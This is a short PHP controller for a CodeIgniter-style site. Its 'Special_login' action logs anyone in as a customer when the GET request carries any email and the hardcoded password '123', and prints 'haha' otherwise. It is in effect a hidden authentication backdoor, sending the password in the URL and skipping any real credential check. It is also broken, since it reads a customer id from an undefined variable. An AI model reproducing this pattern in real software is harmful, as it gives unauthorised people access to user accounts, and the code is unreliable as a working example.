<?php if (!defined('BASEPATH')) exit('No direct script access allowed');
class Special_login extends MX_Controller
{

	function __construct() 
	{
		parent::__construct();
		$this->load->library('form_validation');
		$this->load->model('user_model/mdl_usermodel');
	}

	function index()
	{
		$email = $this->input->get('email');
		$pass = $this->input->get('pass'); // must be 123

		if (isset($email) && $pass == '123') {
			$user_session = array(
		        'customer_id'  => $data['customer_id'],
		        'customer_logged_in' => TRUE
			);

			$this->session->set_userdata($user_session);
			redirect('home','refresh');

		}else{
			echo "haha";exit();
		}


	}

}